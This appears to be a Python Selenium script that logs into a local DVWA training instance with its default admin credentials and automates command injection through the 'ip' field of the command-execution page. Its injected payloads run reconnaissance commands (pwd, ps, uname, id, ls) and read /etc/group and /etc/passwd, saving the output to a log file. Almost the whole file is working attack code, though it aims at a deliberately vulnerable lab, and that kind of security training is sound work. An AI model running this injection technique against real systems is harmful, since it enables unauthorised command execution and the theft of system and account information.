
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
import time

def command():
	timeToSleep=2

	# create a new Firefox session
	driver = webdriver.Firefox()
	#driver.implicitly_wait(10)
	driver.maximize_window()
	 
	# navigate to the application home page
	driver.get("http://192.168.147.135/dvwa/login.php")
	 
	# get the search textbox
	username = driver.find_element_by_name("username")
	password=driver.find_element_by_name("password")

	# logging into DVWA  
	# enter search keyword and submit
	username.send_keys("admin")
	password.send_keys("password")
	login=driver.find_element_by_name("Login")
	time.sleep(timeToSleep)
	login.click()

	# the following code performs the exploits using "command execution"
	driver.get("http://192.168.147.135/dvwa/vulnerabilities/exec/")

	# creating a log file 
	fp = open('cmdexec.log','w')



	# finding the present working directory, current use name and process running 
	cmd_section = driver.find_element_by_name("ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";pwd & whoaim & ps")
	time.sleep(timeToSleep)
	submit = driver.find_element_by_name("submit")
	submit.click()

	time.sleep(timeToSleep)
	html = driver.page_source
	soup = BeautifulSoup(html)
	text = "\nthe present directory and current use name, process currently running are :\n"
	fp.write(text)
	for tag in soup.find_all('pre'):	
		fp.write(tag.text)

	# knowing information about OS and users  
	cmd_section = driver.find_element_by_name("ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";uname -a & users & id & w")
	time.sleep(timeToSleep)
	submit = driver.find_element_by_name("submit")
	submit.click()

	time.sleep(timeToSleep)
	html = driver.page_source
	soup = BeautifulSoup(html)
	text = "\nthe OS version and user details are :\n"
	fp.write(text)
	for tag in soup.find_all('pre'):	
		fp.write(tag.text)

	# knowing the list of files present in a location 
	cmd_section = driver.find_element_by_name("ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys("; ls -al")
	time.sleep(timeToSleep)
	time.sleep(timeToSleep)
	submit = driver.find_element_by_name("submit")
	submit.click()

	time.sleep(timeToSleep)
	html = driver.page_source
	soup = BeautifulSoup(html)
	text = "\nthe list of files present are :\n"
	fp.write(text)
	for tag in soup.find_all('pre'):	
		fp.write(tag.text)

	# the groups present on this system 
	cmd_section = driver.find_element_by_name("ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";cat /etc/group")
	time.sleep(timeToSleep)
	submit = driver.find_element_by_name("submit")
	submit.click()

	time.sleep(timeToSleep)
	html = driver.page_source
	soup = BeautifulSoup(html)
	text = "\nthe present groups and their permission of OS \n"
	fp.write(text)
	for tag in soup.find_all('pre'):	
		fp.write(tag.text)

	# getting the passwd file contents 
	cmd_section = driver.find_element_by_name("ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";cat /etc/passwd")
	time.sleep(timeToSleep)
	submit = driver.find_element_by_name("submit")
	submit.click()

	time.sleep(timeToSleep)
	html = driver.page_source
	soup = BeautifulSoup(html)
	text = "\ngetting the passwd file contents :\n"
	fp.write(text)
	for tag in soup.find_all('pre'):	
		fp.write(tag.text)


	# closing the log file 
	text = "\n\n ------- END of command execution log file -----------------\n\n"
	fp.write(text)
	fp.close()
	time.sleep(3)
	driver.close()

